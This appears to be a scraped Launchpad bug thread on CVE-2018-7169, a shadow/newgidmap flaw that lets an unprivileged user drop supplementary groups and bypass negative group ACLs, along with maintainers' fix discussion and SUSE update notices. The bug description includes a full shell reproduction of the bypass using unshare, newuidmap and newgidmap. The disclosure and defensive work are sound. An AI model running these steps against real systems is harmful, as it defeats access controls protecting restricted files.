| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-02-16: |  |  | [#28](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/28) |
| --- | --- | --- | --- |

Fixed for Factory: sr#577189

Fixed for Factory: sr#577189

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Mvetter (mvetter)](https://launchpad.net/~mvetter) wrote on 2018-02-16: |  |  | [#29](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/29) |
| --- | --- | --- | --- |

Thanks for adding the patch.

SR accepted. Forwarded to Factory as SR#577204.

Thanks for adding the patch.
SR accepted. Forwarded to Factory as SR#577204.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-02-16: |  |  | [#30](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/30) |
| --- | --- | --- | --- |

Didn't realize that we backported this feature to our SLE12 codestream. Applied the patch there, too: sr#155145

Didn't realize that we backported this feature to our SLE12 codestream. Applied the patch there, too: sr#155145

[Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar)
on 2018-02-19

| Changed in shadow (openSUSE): | |
| --- | --- |
| **importance**: | Undecided → Unknown |
| **status**: | New → Unknown |

[Bug Watch Updater (bug-watch-updater)](https://launchpad.net/~bug-watch-updater)
on 2018-02-19

| Changed in shadow (openSUSE): | |
| --- | --- |
| **importance**: | Unknown → Medium |
| **status**: | Unknown → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-02-19: |  |  | [#31](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/31) |
| --- | --- | --- | --- |

<https://github.com/shadow-maint/shadow/pull/99> includes the allow\_setgroups/deny\_setgroups feature that we discussed earlier.

https://github.com/shadow-maint/shadow/pull/99 includes the allow\_setgroups/deny\_setgroups feature that we discussed earlier.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Swamp-a (swamp-a)](https://launchpad.net/~swamp-a) wrote on 2018-03-12: |  |  | [#32](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/32) |
| --- | --- | --- | --- |

SUSE-SU-2018:0662-1: An update that fixes one vulnerability is now available.

Category: security (moderate)

Bug References: 1081294

CVE References: CVE-2018-7169

Sources used:

SUSE Linux Enterprise Server for Raspberry Pi 12-SP2 (src): shadow-4.2.1-27.6.1

SUSE Linux Enterprise Server 12-SP3 (src): shadow-4.2.1-27.6.1

SUSE Linux Enterprise Server 12-SP2 (src): shadow-4.2.1-27.6.1

SUSE Linux Enterprise Desktop 12-SP3 (src): shadow-4.2.1-27.6.1

SUSE Linux Enterprise Desktop 12-SP2 (src): shadow-4.2.1-27.6.1

SUSE CaaS Platform ALL (src): shadow-4.2.1-27.6.1

OpenStack Cloud Magnum Orchestration 7 (src): shadow-4.2.1-27.6.1

SUSE-SU-2018:0662-1: An update that fixes one vulnerability is now available.
Category: security (moderate)
Bug References: 1081294
CVE References: CVE-2018-7169
Sources used:
SUSE Linux Enterprise Server for Raspberry Pi 12-SP2 (src): shadow-4.2.1-27.6.1
SUSE Linux Enterprise Server 12-SP3 (src): shadow-4.2.1-27.6.1
SUSE Linux Enterprise Server 12-SP2 (src): shadow-4.2.1-27.6.1
SUSE Linux Enterprise Desktop 12-SP3 (src): shadow-4.2.1-27.6.1
SUSE Linux Enterprise Desktop 12-SP2 (src): shadow-4.2.1-27.6.1
SUSE CaaS Platform ALL (src): shadow-4.2.1-27.6.1
OpenStack Cloud Magnum Orchestration 7 (src): shadow-4.2.1-27.6.1

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Swamp-a (swamp-a)](https://launchpad.net/~swamp-a) wrote on 2018-03-13: |  |  | [#33](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/33) |
| --- | --- | --- | --- |

openSUSE-SU-2018:0667-1: An update that fixes one vulnerability is now available.

Category: security (moderate)

Bug References: 1081294

CVE References: CVE-2018-7169

Sources used:

openSUSE Leap 42.3 (src): shadow-4.2.1-13.1

openSUSE-SU-2018:0667-1: An update that fixes one vulnerability is now available.
Category: security (moderate)
Bug References: 1081294
CVE References: CVE-2018-7169
Sources used:
openSUSE Leap 42.3 (src): shadow-4.2.1-13.1

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2018-03-13: |  |  | [#34](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/34) |
| --- | --- | --- | --- |

@stgraber @mdeslaur - I'd considered making a release for Ubuntu... but this is the negative acl thing... Your opinions appreciated.

@stgraber @mdeslaur - I'd considered making a release for Ubuntu... but this is the negative acl thing... Your opinions appreciated.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Mvetter (mvetter)](https://launchpad.net/~mvetter) wrote on 2018-07-02: |  |  | [#35](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/35) |
| --- | --- | --- | --- |

I think this can be closed.

I think this can be closed.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| In [bugzilla.opensuse.org/ #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294), [Kbabioch-b (kbabioch-b)](https://launchpad.net/~kbabioch-b) wrote on 2018-07-16: |  |  | [#36](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/36) |
| --- | --- | --- | --- |

All updates released.

All updates released.

[Bug Watch Updater (bug-watch-updater)](https://launchpad.net/~bug-watch-updater)
on 2018-07-16

| Changed in shadow (openSUSE): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |

[Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn)
on 2023-08-29

| Changed in shadow (Ubuntu): | |
| --- | --- |
| **importance**: | Undecided → Low |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/shadow/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

* [auto-bugzilla.opensuse.org #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294)

  [RESOLVED FIXED]
  [Edit](/bugs/1729357/%2Bwatch/127779 "Change watch details")

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from launchpad.net_acda6f3b_20250126_094445.html ===

[Log in / Register](https://launchpad.net/~cyphar/%2Blogin)

[![](/@@/person-logo)](https://launchpad.net/~cyphar)

## [Aleksa Sarai](https://launchpad.net/~cyphar)

* Overview
* [Code](https://code.launchpad.net/~cyphar)
* [Bugs](https://bugs.launchpad.net/~cyphar)
* [Blueprints](https://blueprints.launchpad.net/~cyphar)
* [Translations](https://translations.launchpad.net/~cyphar)
* [Answers](https://answers.launchpad.net/~cyphar)

* [Related packages](https://launchpad.net/~cyphar/%2Brelated-packages)
* [Related projects](https://launchpad.net/~cyphar/%2Brelated-projects)

## User information

Launchpad Id:
cyphar

Email:
[Log in](%2Blogin) for email information.

Member since:
2017-07-10

Languages:

English

Time zone:

UTC
(UTC+0000)

Karma:
[0](https://launchpad.net/~cyphar/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

## Latest memberships

Aleksa Sarai is not an
active member of any Launchpad teams.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugs.launchpad.net_fb168f84_20250126_094447.html ===

[Log in / Register](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/%2Blogin)

[![](https://launchpadlibrarian.net/606381979/CoF%2064px.png)](https://launchpad.net/ubuntu)

## [Ubuntu](https://launchpad.net/ubuntu)[shadow package](https://launchpad.net/ubuntu/%2Bsource/shadow)

* [Overview](https://launchpad.net/ubuntu/%2Bsource/shadow)
* [Code](https://code.launchpad.net/ubuntu/%2Bsource/shadow)
* [Bugs](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow)
* Blueprints
* [Translations](https://translations.launchpad.net/ubuntu/%2Bsource/shadow)
* [Answers](https://answers.launchpad.net/ubuntu/%2Bsource/shadow)

# unprivileged user can drop supplementary groups

Bug #1729357 reported by
[Craig Furman](https://launchpad.net/~craigpivotal)
on 2017-11-01

[272](/%2Bhelp-bugs/bug-heat.html)

This bug affects 2 people

| Affects | | Status | Importance | Assigned to | Milestone |
| --- | --- | --- | --- | --- | --- |
|  | [shadow (Ubuntu)](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow "Latest release: 1:4.16.0-7ubuntu1, uploaded to main on 2025-01-13 22:04:10.516110+00:00 by Skia (hyask), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)") | Confirmed | Low | Unassigned |  |
|  | [shadow (openSUSE)](https://bugs.launchpad.net/opensuse/%2Bsource/shadow "No current release for this source package in openSUSE") | Fix Released | Medium | [auto-bugzilla.opensuse.org #1081294](https://bugzilla.opensuse.org/show_bug.cgi?id=1081294) |  |

### Bug Description

Distribution: Ubuntu 16.04.3 LTS

Kernel: 4.4.0-97-generic

uidmap package version: 1:4.2-3.1ubuntu5.3

The newgidmap setuid executable allows any user to write a single mapping line to the gid\_map of a process whose identity is the same as the calling process, as long as that mapping line maps the process's own GID outside of the user namespace to GID 0 inside the user namespace.

Newgidmap will write the mapping regardless of the content of /proc/$process\_being\_mapped/setgroups, which will initially contain the string "allow". After this mapping is performed, and also after the process' uid\_map is written with newuidmap, the process in the user namespace will be able to use the setgroups system call to drop supplementary groups.

This is possible even if there is no entry for the user in /etc/subgid, because no subordinate GIDs are actually being used.

This allows any user to circumvent the use of supplementary groups as blacklists, e.g. for some file owned by root:blacklist with permission bits 0604 (octal). Normally any process whose identity included the group "blacklist" in its supplementary groups would not be able to read that file. By performing this exploit using newgidmap, they can drop all supplementary groups and read that file.

If newgidmap was not available, unprivileged users would not be able to write a process's gid\_map until writing "deny" to /proc/$pid/setgroups. A fix for this might be for newgidmap to check the content of /proc/$process\_being\_mapped/setgroups is "deny", but we have not tried to patch this ourselves.

An example using 2 login shells for a user named "someone" on Ubuntu Xenial, with the uidmap package installed:

Shell 1

someone@ubuntu-xenial:~$ id

uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)

someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict

-rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict

someone@ubuntu-xenial:~$ cat /tmp/should\_restrict

cat: /tmp/should\_restrict: Permission denied

someone@ubuntu-xenial:~$ unshare -U --setgroups allow # /proc/self/setgroups already contains 'allow', but let's be explicit

nobody@ubuntu-xenial:~$ echo $$

1878

Shell 2

someone@ubuntu-xenial:~$ cat /etc/subuid

lxd:100000:65536

root:100000:65536

ubuntu:165536:65536

someone@ubuntu-xenial:~$ cat /etc/subgid

lxd:100000:65536

root:100000:65536

ubuntu:165536:65536

# There are no entries in /etc/sub{u,g}id for someone, but this doesn't matter that much as subordinate IDs are not being requested.

someone@ubuntu-xenial:~$ newuidmap 1878 0 1001 1

someone@ubuntu-xenial:~$ newgidmap 1878 0 1001 1

Back to shell 1

nobody@ubuntu-xenial:~$ id

uid=0(root) gid=0(root) groups=0(root),65534(nogroup)

# The presence of the "nogroup" supplementary group indicates that some unmapped GIDs are present as supplementary GIDs. The kernel knows that this process still has "restricted" in its supplementary groups, so it can't read the restricted file yet.

nobody@ubuntu-xenial:~$ cat /tmp/should\_restrict

cat: /tmp/should\_restrict: Permission denied

# The process has gained CAP\_SETGID in its user namespace by becoming UID 0. /proc/$pid/setgroups contains "allow", so it can call setgroups(2). By su-ing to root (itself, in the user namespace), it can drop the supplementary groups. It can't read /root/.bashrc as that file is owned by UID 0 in the initial user namespace, which creates some distracting error output but doesn't matter in this case.

nobody@ubuntu-xenial:~$ su root

su: Authentication failure

(Ignored)

bash: /root/.bashrc: Permission denied

# Supplementary groups have been dropped

root@ubuntu-xenial:~# id

uid=0(root) gid=0(root) groups=0(root)

# It can read the restricted file

root@ubuntu-xenial:~# cat /tmp/should\_restrict

content

## CVE References

* [2018-7169](/bugs/cve/2018-7169 "An issue was discovered in shadow 4.5...")

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-11-02: |  |  | [#1](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/1) |
| --- | --- | --- | --- |

Hi Craig, interesting finding, thanks for reporting it to us.

Hi Craig, interesting finding, thanks for reporting it to us.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2017-11-07: |  |  | [#2](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/2) |
| --- | --- | --- | --- |

Hi,

thanks for pointing this out.

would you mind posting a patch to fix this?

It looks like a real bug, except I'm a bit confused as to how this features is supposed to be used in the first place. The point of the setgroups=deny feature was to not regress the case where you use a negative group acl to deny a user from reading a file, right? But near as I can tell you can only enable setgroups=deny when creating a new user namespace, so such an admin is in any case required to step through new hoops to not regress functionality, which would be unacceptable.

In any case, my feeling on the bug is that it is CVE-worthy, but does not need to be secret (since the workaround is chmod 000 /usr/bin/newgidmap or apt purge uidmap. Does that seem reasonable?

Hi,
thanks for pointing this out.
would you mind posting a patch to fix this?
It looks like a real bug, except I'm a bit confused as to how this features is supposed to be used in the first place. The point of the setgroups=deny feature was to not regress the case where you use a negative group acl to deny a user from reading a file, right? But near as I can tell you can only enable setgroups=deny when creating a new user namespace, so such an admin is in any case required to step through new hoops to not regress functionality, which would be unacceptable.
In any case, my feeling on the bug is that it is CVE-worthy, but does not need to be secret (since the workaround is chmod 000 /usr/bin/newgidmap or apt purge uidmap. Does that seem reasonable?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2017-11-07: |  |  | [#3](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/3) |
| --- | --- | --- | --- |

Well, there is the slight problem that every single Ubuntu server install comes with newgidmap installed today so I think we do need to be careful with releasing a fix for this as there may well be users of LXC/LXD that also rely on negative groups for access control on their system.

Your suggestion to chmod 000 newgidmap would break those users and is certainly not something that'd be suitable for a security upload.

Well, there is the slight problem that every single Ubuntu server install comes with newgidmap installed today so I think we do need to be careful with releasing a fix for this as there may well be users of LXC/LXD that also rely on negative groups for access control on their system.
Your suggestion to chmod 000 newgidmap would break those users and is certainly not something that'd be suitable for a security upload.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2017-11-07:  [**Re: [Bug 1729357] Re: unprivileged user can drop supplementary groups**](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/4) |  |  | [#4](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/4) |
| --- | --- | --- | --- |

@stgraber,

Still trying to wrap my head around whether this currently actually

works. Can you verify that you can use setgroups=deny with a negative

acl in the initial user\_ns to prevent a user doing the equivalent of

lxc-usernsexec -m b:0:$(id -u):1 to get around the acl?

@stgraber,
Still trying to wrap my head around whether this currently actually
works. Can you verify that you can use setgroups=deny with a negative
acl in the initial user\_ns to prevent a user doing the equivalent of
lxc-usernsexec -m b:0:$(id -u):1 to get around the acl?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2017-11-07: |  |  | [#5](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/5) |
| --- | --- | --- | --- |

I think you could but we don't have any PAM module that lets you do that today.

I think you could but we don't have any PAM module that lets you do that today.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2017-11-07: |  |  | [#6](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/6) |
| --- | --- | --- | --- |

Oh, actually, according to <https://lwn.net/Articles/626665/> the setgroups file is a namespace specific knob, so flipping it to deny would actually prevent setgroups by anyone who's in the host namespace...

Oh, actually, according to https://lwn.net/Articles/626665/ the setgroups file is a namespace specific knob, so flipping it to deny would actually prevent setgroups by anyone who's in the host namespace...

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Stéphane Graber (stgraber)](https://launchpad.net/~stgraber) wrote on 2017-11-07: |  |  | [#7](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/7) |
| --- | --- | --- | --- |

Thinking about this problem a bit, it certainly sounds like for the normal case we'd want newgidmap to flip setgroups to false prior to writing the map, effectively preventing this issue.

The obvious problem is that we have very legitimate use cases where we absolutely do want newgidmap to write a map to /proc/PID/gid\_map and keep setgroups allowed. That's what we need for fully unprivileged LXC containers.

My current thought here is that we'd effectively need a way to record in what case this is okay, so that an administrator can apply this on a per-user basis. My initial plan there was to add an extra column to /etc/subgid to control that, but it actually seems to be unrelated to the map used and more of a per-user attribute that should be tracked separately.

Thinking about this problem a bit, it certainly sounds like for the normal case we'd want newgidmap to flip setgroups to false prior to writing the map, effectively preventing this issue.
The obvious problem is that we have very legitimate use cases where we absolutely do want newgidmap to write a map to /proc/PID/gid\_map and keep setgroups allowed. That's what we need for fully unprivileged LXC containers.
My current thought here is that we'd effectively need a way to record in what case this is okay, so that an administrator can apply this on a per-user basis. My initial plan there was to add an extra column to /etc/subgid to control that, but it actually seems to be unrelated to the map used and more of a per-user attribute that should be tracked separately.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Craig Furman (craigpivotal)](https://launchpad.net/~craigpivotal) wrote on 2017-11-08: |  |  | [#8](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/8) |
| --- | --- | --- | --- |

I agree that in order to preserve the ability of unprivileged containers to call setgroups we need some root-owned config file (possibly a column in /etc/subgid, possibly a new file) that controls which users newgidmap \*won't\* set /proc/$pid/setgroups to deny for.

Serge, I'm not much of a C programmer but I'd be happy to try writing a patch once we decide on the solution.

I agree that in order to preserve the ability of unprivileged containers to call setgroups we need some root-owned config file (possibly a column in /etc/subgid, possibly a new file) that controls which users newgidmap \*won't\* set /proc/$pid/setgroups to deny for.
Serge, I'm not much of a C programmer but I'd be happy to try writing a patch once we decide on the solution.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Seth Arnold (seth-arnold)](https://launchpad.net/~seth-arnold) wrote on 2017-11-14: |  |  | [#9](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/9) |
| --- | --- | --- | --- |

Eric W. Biederman contributed this via email:

> The short answer is that if you want negative acls to work don't try and

> apply them to a user in /etc/subuid or /etc/subgid.

>

> To my knowledge there is not a good solution to this problem.

>

> As for setting setgroups to deny that is the default setting if you do

> nothing. Allow can't be set until the gid map is set. Plus there

> are some inheritence rules that ensure if your parent has deny set you

> always will have deny set.

>

> To date in my experience negative group acls are a theoretical construct

> that no one actually uses.

Given that there's no clear solution to this problem I'm going to make

this bug public, so others can know that subtracting permissions via group

membership isn't perfect.

Thanks

Eric W. Biederman contributed this via email:
> The short answer is that if you want negative acls to work don't try and
> apply them to a user in /etc/subuid or /etc/subgid.
>
> To my knowledge there is not a good solution to this problem.
>
> As for setting setgroups to deny that is the default setting if you do
> nothing. Allow can't be set until the gid map is set. Plus there
> are some inheritence rules that ensure if your parent has deny set you
> always will have deny set.
>
> To date in my experience negative group acls are a theoretical construct
> that no one actually uses.
Given that there's no clear solution to this problem I'm going to make
this bug public, so others can know that subtracting permissions via group
membership isn't perfect.
Thanks

| **information type**: | Private Security → Public Security |
| --- | --- |
| Changed in shadow (Ubuntu): | |
| **status**: | New → Confirmed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Craig Furman (craigpivotal)](https://launchpad.net/~craigpivotal) wrote on 2017-11-17: |  |  | [#10](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/10) |
| --- | --- | --- | --- |

Thanks for replying Eric, but I'm having trouble reproducing what you've posted. I can't write the gid map until I've written deny to /prod/$pid/setgroups, not the other way around. There might be some nuance I've missed.

Also, newgidmap will allow a user to map their own GID to 0 in the user namespace, even when there is no entry for that user in /etc/subgid.

What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is whitelisted in some config file, probably separate from /etc/subgid, as Stéphane suggested?

Thanks for replying Eric, but I'm having trouble reproducing what you've posted. I can't write the gid map until I've written deny to /prod/$pid/setgroups, not the other way around. There might be some nuance I've missed.
Also, newgidmap will allow a user to map their own GID to 0 in the user namespace, even when there is no entry for that user in /etc/subgid.
What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is whitelisted in some config file, probably separate from /etc/subgid, as Stéphane suggested?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Aleksa Sarai (cyphar)](https://launchpad.net/~cyphar) wrote on 2018-01-15: |  |  | [#11](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/11) |
| --- | --- | --- | --- |

> Thanks for replying Eric, but I'm having trouble reproducing what you've

> posted. I can't write the gid map until I've written deny to

> /prod/$pid/setgroups, not the other way around. There might be some nuance

> I've missed.

Yes, this is a security feature. setgroups must be written to \*before\* gid\_map

(the reason for this is explained further in user\_namespaces(7)). And only

privileged users are allowed to write to gid\_map if setgroups is set to allow.

> Also, newgidmap will allow a user to map their own GID to 0 in the user

> namespace, even when there is no entry for that user in /etc/subgid.

This is something that is generally required for a container to function, and

isn't fundamentally a security issue because users are already allowed to do

that without privileges (this is how rootless containers and LXC unprivileged

containers work) -- \*unless\* in this mode newgidmap is setting setgroups=allow

(in which case this is a major security problem).

> What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is

> whitelisted in some config file, probably separate from /etc/subgid, as

> Stéphane suggested?

:+1: I'd prefer if we implemented this by changing the /etc/subgid schema so

that rather than having the format

user:id:id\_cnt

It has the format

user:id:id\_cnt[:flagA,flagB,...]

And we define flags "allow\_setgroups" and "deny\_setgrouops" (with

"deny\_setgroups" being the default). This way, administrators can be \*explicit\*

about the denial, we don't add any new configuration files, and it's backwards

compatible (with security being opt-out).

I imagine making deny\_setgroups might be a \*bit\* contentious, but in the worst

case we could have a migration script that asks users (or just add a document

about it to the logfile for the upgrade).

> Thanks for replying Eric, but I'm having trouble reproducing what you've
> posted. I can't write the gid map until I've written deny to
> /prod/$pid/setgroups, not the other way around. There might be some nuance
> I've missed.
Yes, this is a security feature. setgroups must be written to \*before\* gid\_map
(the reason for this is explained further in user\_namespaces(7)). And only
privileged users are allowed to write to gid\_map if setgroups is set to allow.
> Also, newgidmap will allow a user to map their own GID to 0 in the user
> namespace, even when there is no entry for that user in /etc/subgid.
This is something that is generally required for a container to function, and
isn't fundamentally a security issue because users are already allowed to do
that without privileges (this is how rootless containers and LXC unprivileged
containers work) -- \*unless\* in this mode newgidmap is setting setgroups=allow
(in which case this is a major security problem).
> What if newgidmap wrote "deny" to /proc/$pid/setgroups unless the user is
> whitelisted in some config file, probably separate from /etc/subgid, as
> Stéphane suggested?
:+1: I'd prefer if we implemented this by changing the /etc/subgid schema so
that rather than having the format
user:id:id\_cnt
It has the format
user:id:id\_cnt[:flagA,flagB,...]
And we define flags "allow\_setgroups" and "deny\_setgrouops" (with
"deny\_setgroups" being the default). This way, administrators can be \*explicit\*
about the denial, we don't add any new configuration files, and it's backwards
compatible (with security being opt-out).
I imagine making deny\_setgroups might be a \*bit\* contentious, but in the worst
case we could have a migration script that asks users (or just add a document
about it to the logfile for the upgrade).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Akihiro Suda (suda-kyoto)](https://launchpad.net/~suda-kyoto) wrote on 2018-01-15: |  |  | [#12](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/12) |
| --- | --- | --- | --- |

> And we define flags "allow\_setgroups" and "deny\_setgrouops" (with

"deny\_setgroups" being the default).

I think allow\_setgropus should be the default for keeping compatibility.

However, useradd(8) may print warning for the default configuration.

> And we define flags "allow\_setgroups" and "deny\_setgrouops" (with
"deny\_setgroups" being the default).
I think allow\_setgropus should be the default for keeping compatibility.
However, useradd(8) may print warning for the default configuration.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Serge Hallyn (serge-hallyn)](https://launchpad.net/~serge-hallyn) wrote on 2018-01-15: |  |  | [#13](/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/13) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/ubuntu/%2Bsource/shadow/%2Bbug/1729357/comments/13/%2Bdownload) (5.0 KiB)

This sounds acceptable to me. Issues or (even better) PRs against

github.com/shadow-maint/shadow would be great :)

Indeed the default should be the more permissible. (I won't accept

patches which require changes to the container runtime.)

On Mon, Jan 15, 2018 at 9:13 AM, Akihiro Suda <email address hidden> wrote:

>> And we define flags "allow\_setgroups" and "deny\_setgrouops" (with

> "deny\_setgroups" being the default).

>

>

> I think allow\_setgropus should be the default for keeping compatibility.

>

> However, useradd(8) may print warning for the default configuration.

>

> --

> You received this bug notification because you are subscribed to the bug

> report.

> <https://bugs.launchpad.net/bugs/1729357>

>

> Title:

> unprivileged user can drop supplementary groups

>

> Status in shadow package in Ubuntu:

> Confirmed

>

> Bug description:

> Distribution: Ubuntu 16.04.3 LTS

> Kernel: 4.4.0-97-generic

> uidmap package version: 1:4.2-3.1ubuntu5.3

>

> The newgidmap setuid executable allows any user to write a single

> mapping line to the gid\_map of a process whose identity is the same as

> the calling process, as long as that mapping line maps the process's

> own GID outside of the user namespace to GID 0 inside the user

> namespace.

>

> Newgidmap will write the mapping regardless of the content of

> /proc/$process\_being\_mapped/setgroups, which will initially contain

> the string "allow". After this mapping is performed, and also after

> the process' uid\_map is written with newuidmap, the process in the

> user namespace will be able to use the setgroups system call to drop

> supplementary groups.

>

> This is possible even if there is no entry for the user in

> /etc/subgid, because no subordinate GIDs are actually being used.

>

> This allows any user to circumvent the use of supplementary groups as

> blacklists, e.g. for some file owned by root:blacklist with permission

> bits 0604 (octal). Normally any process whose identity included the

> group "blacklist" in its supplementary groups would not be able to

> read that file. By performing this exploit using newgidmap, they can

> drop all supplementary groups and read that file.

>

> If newgidmap was not available, unprivileged users would not be able

> to write a process's gid\_map until writing "deny" to

> /proc/$pid/setgroups. A fix for this might be for newgidmap to check

> the content of /proc/$process\_being\_mapped/setgroups is "deny", but we

> have not tried to patch this ourselves.

>

> An example using 2 login shells for a user named "someone" on Ubuntu

> Xenial, with the uidmap package installed:

>

> Shell 1

>

> someone@ubuntu-xenial:~$ id

> uid=1001(someone) gid=1001(someone) groups=1001(someone),1002(restricted)

>

> someone@ubuntu-xenial:~$ ls -al /tmp/should\_restrict

> -rw----r-- 1 root restricted 8 Nov 1 12:23 /tmp/should\_restrict

>

> someone@ubuntu-xenial:~$ cat /tmp/should\_restrict

> cat: /tmp/should\_restrict: Permission denied

>

> someone@ubuntu-xenial:~$ unshare -U --setgroups allow #

> /proc/self/setgroups already contains 'allow', but let's be explicit

>

> nobody@ubuntu-xenial:~$ echo $$

> 1878

>

> Sh...

